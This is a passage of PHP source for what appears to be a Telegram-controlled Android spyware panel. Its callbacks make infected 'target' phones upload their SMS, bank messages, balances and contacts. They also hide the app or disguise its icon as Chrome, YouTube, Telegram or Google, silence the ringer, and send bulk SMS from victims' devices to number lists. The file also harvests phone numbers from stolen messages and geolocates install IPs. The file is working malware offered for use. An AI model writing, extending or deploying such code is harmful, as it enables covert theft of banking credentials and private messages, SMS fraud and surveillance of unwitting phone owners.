                [['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"], ['text' => "👤 ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ 👤", 'callback_data' => "all_contacts $dev_id_use"], ['text' => "📁 ᴀʟʟ ꜱᴍꜱ 📁", 'callback_data' => "all_sms $dev_id_use"]],
                [['text' => "💸 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ 💸", 'callback_data' => "last_Bank_sms $dev_id_use"], ['text' => "🏦 ʙᴀɴᴋ ꜱᴍꜱ 🏦", 'callback_data' => "All_Bank_sms $dev_id_use"], ['text' => "💰 ʙᴀɴᴋꜱ ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]],
                [['text' => "🔉ᴠɪʙʀᴀᴛᴇ🔉", 'callback_data' => "vibrate_mode $dev_id_use"], ['text' => "🔇 ᴍᴜᴛᴇ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => "silent_mode $dev_id_use"], ['text' => "🔊 ɴᴏʀᴍᴀʟ ᴛᴀʀɢᴇᴛ 🔊", 'callback_data' => "normal_mode $dev_id_use"]],
                [['text' => "👻  ʜɪᴅᴇ ɪᴄᴏɴ  👻", 'callback_data' => "hide_icon $dev_id_use"], ['text' => "🪄 ᴜɴʜɪᴅᴇ 🪄", 'callback_data' => "visible_icon $dev_id_use"]],
                [['text' => "📱 ᴍᴏᴅᴇʟ ᴅᴇᴠɪᴄᴇ",'callback_data' => "WhatsChecker $dev_id_use"], ['text' => "🔎 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ 🔎", 'callback_data' => "searchSMS $dev_id_use"], ['text' => "ℹ️ ꜰᴜʟʟ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ℹ️", "callback_data" => "information $dev_id_use"]],
                [['text' => "🔄 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🔄", 'callback_data' => "change $dev_id_use"]],
                [['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => 'back_home']]
            ]]);

        smg($chat_id, "‹‹ <b>Device Control</b> ›› section\n\nSelect the desired option :", $panel_log);

    } elseif (strpos($data, 'fs') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
        requests('hidden', $datass[1]);
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);

    } elseif (strpos($data, 'newic') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
        requests('changetogoogle', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", null);

    } elseif (strpos($data, 'hg') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-ringer.txt", "Silent");
        requests('silent', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);
    } elseif (strpos($data, 'rt') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);
        requests('status', $datass[1]);

    } elseif (strpos($data, 'wqw') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('last_sms', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b> ", $geeeh);

    } elseif (strpos($data, 'kkkk') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('all_sms', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);

    } elseif (strpos($data, 'Kops') !== false) {
        $datass = explode(" ", $data);
        $word = file_get_contents("user/$chat_id/word.txt");
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('WhatsChecker', $datass[1]);
        smg($chat_id, "<b>CheCk $word \nApproximate time : 3 seconds</b>", $geeeh);

    } elseif (strpos($data, "offmodeon ") !== False) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        file_put_contents("user/$device_id-offline.txt", "ON");
        $control_button = control_button($datass[1]);
        emg($chat_id, $mi, "‹‹ <b>Offline Mode On</b> ›› section\n\nSelect the desired option :", $control_button);
        requestSMS("offline_mode_on", $device_id, $offline_number, null);
    } elseif (strpos($data, "offmodeoff") !== False) {

        $datass = explode(" ", $data);
        file_put_contents("user/$datass[1]-offline.txt", "OFF");
        $control_button = control_button($datass[1]);
        emg($chat_id, $mi, "‹‹ <b>Offline Mode Off</b> ›› section\n\nSelect the desired option :", $control_button);
        requestSMS("offline_mode_off", $datass[1], $offline_number, null);

    } elseif ($data == "auto_hide") {
        if ($action_autohide == "off") {
            file_put_contents("data/autohide.txt", "on");
            emg($chat_id, $mi, "‹‹ <b>Auto Hide On</b> ›› section\n\nSelect the desired option :", $settings_button);

        } else {
            file_put_contents("data/autohide.txt", "off");
            emg($chat_id, $mi, "‹‹ <b>Auto Hide Off</b> ›› section\n\nSelect the desired option :", $settings_button);
        }
    } elseif ($data == "online_model") {
        emg($chat_id, $mi, "‹‹ <b>Model Send Online</b> ›› section\n\nSelect the desired option :", $model_button);
    } elseif ($data == "list_model") {
        emg($chat_id, $mi, "‹‹ <b>List Sended</b> ›› sectionSelected ", $back_settings);
        file_put_contents("data/online_model.txt", "list");
    } elseif ($data == "singel_model") {
        emg($chat_id, $mi, "‹‹ <b>Singel Sended</b> ›› section Selected ", $back_settings);
        file_put_contents("data/online_model.txt", "singel");
    } elseif ($data == "first_sms") {
        if ($action_firstsms == "off") {
            file_put_contents("data/firstsms.txt", "on");
            emg($chat_id, $mi, "‹‹ <b>First SMS On</b> ›› section\n\nSelect the desired option :", $settings_button);

        } else {
            file_put_contents("data/firstsms.txt", "off");
            emg($chat_id, $mi, "‹‹ <b>First SMS Off</b> ›› section\n\nSelect the desired option :", $settings_button);
        }
    } elseif (strpos($text, '/block_') !== false) {
        $txt = explode("_", $text);
        $dev_id0 = str_replace('/block_', '', $text);
        $ip_block = $dev_id0;
        $file_accses = file_get_contents("block.txt");
        file_put_contents("block.txt", "$file_accses\n$ip_block");
        smg($chat_id, "IP <b>$ip_block</b> Blocked !", null);

    } elseif (strpos($text, '/unblock_') !== false) {
        $txt = explode("_", $text);
        $dev_id0 = str_replace('/unblock_', '', $text);
        $ip_block = $dev_id0;
        $file_content = file_get_contents("block.txt");
        $new_content = str_replace($ip_block, '', $file_content);

        file_put_contents("block.txt", $new_content);
        smg($chat_id, "IP <b>$ip_block</b> unblocked", null);
    } elseif ($data == "set_text") {
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set text");

    } elseif ($text == "/all_unblock") {
        file_put_contents("block.txt", "");
        smg($chat_id, "<b>All IP's were successfully unblocked</b>", null);
        exit();

    } elseif ($command == "set text") {

        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("data/message-first.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "set_word") {
        emg($chat_id, $mi, "Please send the <b>Word Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set word");

    } elseif ($command == "set word") {

        smg($chat_id, "<b>Word</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("user/$chat_id/word.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");

    } elseif (strpos($data, "nametarget") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "Please send the <b>Name Target ...</b>", $back_control);
        file_put_contents("user/$chat_id/command.txt", "settragetname $device_id");

    } elseif (strpos($command, "settragetname") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $info_button = info_button($device_id);

        smg($chat_id, "<b>Target Name</b> was successfully set to [ <code>$text</code> ]", $info_button);
        file_put_contents("user/$device_id-name.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");


    } elseif ($data == "set_number") {
        emg($chat_id, $mi, "Please send the <b>SMS Number ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set number");

    } elseif ($command == "set number") {

        smg($chat_id, "<b>SMS Number</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("data/number-first.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "set_number_offline_mode") {
        emg($chat_id, $mi, "Please send the <b>Oflline Mode SimCard Number ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set offline");

    } elseif ($command == "set offline") {

        smg($chat_id, "<b>Oflline Mode SimCard Number </b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("data/offline-number.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "num_senders") {
        $text = file_get_contents("user/AllSMS.txt");
        preg_match_all('/sender : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        foreach ($senders as $sender) {
            if (strpos($sender, '+98') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 12) {

                    $x .= "$sender\n";
                }
            }
            if (strpos($sender, '09') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 11) {

                    $x .= "$sender\n";
                }
            }
        }
        preg_match_all('/sender : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        foreach ($senders as $sender) {
            if (strpos($sender, '+98') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 12) {

                    $x .= "$sender\n";
                }
            }
            if (strpos($sender, '09') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 11) {

                    $x .= "$sender\n";
                }
            }
        }
        $lines = explode("\n", $x);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        bot('sendMessage', [
            'chat_id' => $id_sender,
            'text' => "$result\n@Wild_MaTiN",
            'parse_mode' => 'HTML',
        ]);
    } elseif ($data == "num_con") {
        $text = file_get_contents("user/@Wild_MaTiN");
        preg_match_all('/Phone : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        $n = 0;
        foreach ($senders as $sender) {
            $n += 1;
            $x .= "$sender\n";
            if ($n >= 299) {
                $lines = explode("\n", $x);
                $unique_lines = array_unique($lines);
                $result = implode("\n", $unique_lines);
                bot('sendMessage', [
                    'chat_id' => $id_sender,
                    'text' => "$result",
                    'parse_mode' => 'HTML',
                ]);
                $x = "";
                $n = 0;
            }


        }
        $lines = explode("\n", $x);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        bot('sendMessage', [
            'chat_id' => $id_sender,
            'text' => "$result\n@Wild_MaTiN",
            'parse_mode' => 'HTML',
        ]);
    } elseif ($data == "checkhost") {


        emg($chat_id, $mi, "<b>Check URL From Check-Host.net</b> are being successfully received, Approximate time : 5 seconds", $back_settings);
        $check_result = checkhost($link_show);

        $check_result_string = '';
        foreach ($check_result as $city => $value) {
            if ($value['statuscode'] == "200" || $value['statuscode'] == "301") {
                $emoji = "✅";
            } else {
                $emoji = "⛔️";
            }
            $time = substr($value['time'], 0, 4);
            $mtext = "<b>Check URL From Check-Host.net</b>";

            $check_result_string .= "<b>$emoji $city</b> ==>";
            $check_result_string .= "<b>Status </b> : {$value['status']} | {$value['statuscode']}\n";
            $check_result_string .= "<b>Load Time</b> : $time\n";
            $check_result_string .= "➖➖➖➖➖➖\n";
        }
        smg($chat_id, $check_result_string, null);
    } elseif ($data == "get_all_balance") {
        emg($chat_id, $mi, "<b>Get All Balance</b> are being successfully received, Approximate time : 3 seconds", $back_settings);
        requests('getallbalance', $device_id);
    } elseif ($data == "hide_all") {
        emg($chat_id, $mi, "<b>REQUEST SENT SUCCESSFULLY</b> ", $geeeh);
        requestsAll('hide_all');
    } elseif ($data == "silent_all") {
        emg($chat_id, $mi, "<b>Ringer Mode</b> of all devices successfully changed to [ <b>Silent</b> ]", $back_settings);
        requestsAll('silent_all');
    } elseif ($data == "set_url") {

        emg($chat_id, $mi, "Please send the <b>Portal Link ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set url");

    } elseif ($command == "set url") {

        smg($chat_id, "<b>Portal Link</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("link.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "show_url") {
        emg($chat_id, $mi, "‹‹ <b>Portal Link</b> ›› section\n\nSelect the desired option :", $url_inline);
    } elseif ($data == "sms_all") {
        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Send SMS For All Users</b> ›› section\n\nText Message : [ <code>$text_message</code> ]", $sms_button_all);
    } elseif ($data == "edit_message_all") {
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set message all");
    } elseif ($command == "set message all") {
        file_put_contents("user/$chat_id/message.txt", $text);
        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "set_list_all") {
        emg($chat_id, $mi, "Please send the <b>List Number ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set list all");
    } elseif ($command == "set list all") {

        file_put_contents("user/$chat_id/numberlist.txt", $text);
        smg($chat_id, "<b>List Number</b> was successfully \n\nShould Messages Be Sent?", $send_sms_all);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "last_send_all") {

        emg($chat_id, $mi, "<b>SMS</b> was successfully sent to [ <b>$number_message</b> | <b>$text_message SMS</b> ]", $back_settings);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms_all", null, $str, $text_message);
    } elseif (strpos($data, "information") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $info_button = info_button($device_id);
        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Information</b> ›› section\n\nName Target : [ <code>$target_name</code> ]\n\nInstall IP : [ <code>$install_ip</code> ]", $info_button);
    } elseif (strpos($data, "send_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $sms_button = sms_button($device_id);


        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Send SMS</b> ›› section\n\nText Message : [ <code>$text_message</code> ]", $sms_button);

    } elseif (strpos($data, "searchSMS") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "Please send the <b>Word ...</b>", $back_control);
        file_put_contents("user/$chat_id/command.txt", "setwords $device_id");
    } elseif (strpos($command, "setwords") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("searchSMS", $device_id, null, $text);
        smg($chat_id, "<b>Search $text</b> was successfully Sent to User , Approximate time : 10 seconds", $back_control);

    } elseif ($data == "search_all") {
        emg($chat_id, $mi, "Please send the <b>Word ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set words2");
    } elseif ($command == "set words2") {
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("allSearch", $device_id, null, $text);
        smg($chat_id, "<b>Search $text</b> was successfully Sent to All User , Approximate time : 10 seconds", $back_settings);

    } elseif (strpos($data, "clearinfo") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $info_button = info_button($device_id);
        emg($chat_id, $mi, "All Info Target ( name ) changed to [ <code>Null</code> ]", $info_button);
        file_put_contents("user/$device_id-name.txt", "null");
    } elseif (strpos($data, "edit_message") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_sms = back_sms($device_id);
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_sms);
        file_put_contents("user/$chat_id/command.txt", "setmessage $device_id");

    } elseif (strpos($command, "setmessage") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $back_sms = back_sms($device_id);

        file_put_contents("user/$chat_id/message.txt", $text);
        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_sms);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif (strpos($data, "set_list") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_sms = back_sms($device_id);
        emg($chat_id, $mi, "Please send the <b>List Number ...</b>", $back_sms);
        file_put_contents("user/$chat_id/command.txt", "setlist $device_id");

    } elseif (strpos($command, "setlist") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $send_sms = send_sms($device_id);

        file_put_contents("user/$chat_id/numberlist.txt", $text);
        smg($chat_id, "<b>List Number</b> was successfully \n\nShould Messages Be Sent?", $send_sms);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif (strpos($data, "last_send") !== false) {

        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>SMS</b> was successfully sent to [ <b>$number_message</b> | <b>$text_message SMS</b> ]", $back_control);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms", $device_id, $str, $text_message);


    } elseif (strpos($data, "status_user") !== false) {

        $datass = explode(" ", $data);
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "Checking Device, Approximate time : ( $datass[1] ) 3 seconds", $back_control);
        requests('status', $datass[1]);
    } elseif (strpos($data, "last_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);

        emg($chat_id, $mi, "<b>Last SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('last_sms', $device_id);
    } elseif (strpos($data, "all_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $getsmsButton = getsmsButton($device_id);

        emg($chat_id, $mi, "Choose Type To Get", $getsmsButton);
    } elseif (strpos($data, "sent") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>The messages he sent</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_sms_sent', $device_id);
    } elseif (strpos($data, "Popo ") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>All SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_sms', $device_id);
    } elseif (strpos($data, "all_contacts ") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>All Contact</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_contacts', $device_id);
    } elseif (strpos($data, "recived") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Messages sent to him</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_sms_recived', $device_id);
    } elseif (strpos($data, "balance") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Balance</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('balance', $device_id);

    } elseif (strpos($data, "all_balanc2") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        smg($chat_id, "<b>wait...</b>", null);
        file_put_contents("data/bal.txt", "singel");
        requests('balance', $device_id);
    } elseif (strpos($data, "last_Bank_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Last Bank SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('last_bank_sms', $device_id);
    } elseif (strpos($data, "All_Bank_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>All Bank SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_bank_sms', $device_id);
    } elseif (strpos($data, "WhatsChecker") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $word = file_get_contents("user/$chat_id/word.txt");
        emg($chat_id, $mi, "<b>CheCk $word</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requestSMS("WhatsChecker", $device_id, null, $word);
    } elseif (strpos($data, "vibrate_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Ringer Mode</b> successfully changed to [ <b>Vibrate</b> ]", $back_control);
        requests('Vibrate', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Vibrate");

    } elseif (strpos($data, "silent_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Ringer Mode</b> successfully changed to [ <b>Silent</b> ]", $back_control);
        requests('silent', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Silent");
    } elseif (strpos($data, "normal_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Ringer Mode</b> successfully changed to [ <b>Normal</b> ]", $back_control);
        requests('Normal', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Normal");

    } elseif (strpos($data, "hide_icon") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Apk  Icon</b> successfully changed to [ <b>Hidden</b> ]", $back_control);
        requests('hidden', $device_id);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
    } elseif (strpos($data, "visible_icon") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Apk Icon</b> successfully changed to [ <b>Visible</b> ]", $back_control);
        requests('visible', $device_id);
        file_put_contents("user/$datass[1]-apk.txt", "Visible");
    } elseif (strpos($data, "change") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $changeiconButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "chrome", 'callback_data' => "chrome $datass[1]"], ['text' => "Telegram", 'callback_data' => "telegram $datass[1]"]],
            [['text' => "Youtube", 'callback_data' => "youtube $datass[1]"], ['text' => "Google", 'callback_data' => "google $datass[1]"]],
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]],
        ]]);
        emg($chat_id, $mi, "Choose Your Icon To Change", $changeiconButton);

    } elseif (strpos($data, "chrome") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);

        requests('changetochrome', $device_id);
    } elseif (strpos($data, "telegram") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);
        requests('changetotel', $device_id);
    } elseif (strpos($data, "google") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);
        requests('changetogoogle', $device_id);
    } elseif (strpos($data, "youtube") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);
        requests('changetoyoutube', $device_id);
    }


    if (preg_match("/^(ip) (.*)/$i", $text, $m)) {
        $ip = $m[2];
        $data = file_get_contents("http://ip-api.com/json/$ip");
        $decoded_data = json_decode($data, true);

        $x = "
╔ [ • #IP_INFO • ]  
╠ [ • IP ↬ ({$decoded_data['query']})
╠ [ • Country ↬ ({$decoded_data['country']})
╠ [ • Country Code ↬ ({$decoded_data['countryCode']})
╠ [ • Region ↬ ({$decoded_data['region']})
╠ [ • Region Name ↬ ({$decoded_data['regionName']})
╠ [ • City ↬ ({$decoded_data['city']})
╠ [ • Zip Code ↬ ({$decoded_data['zip']})
╠ [ • Latitude ↬ ({$decoded_data['lat']})
╠ [ • Longitude ↬ ({$decoded_data['lon']})
╠ [ • Timezone ↬ ({$decoded_data['timezone']})
╠ [ • ISP ↬ ({$decoded_data['isp']})
╠ [ • Organization ↬ ({$decoded_data['org']})
╠ [ • AS Number ↬ ({$decoded_data['as']})
╚ [ • Coded by : @Wild_MaTiN • ]
";
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "$x",
            'parse_mode' => "html",
        ]);

        bot('sendLocation', [
            'chat_id' => $chat_id,
            'latitude' => "{$decoded_data['lat']}",
            'longitude' => "{$decoded_data['lon']}",
        ]);

    }
}


?>

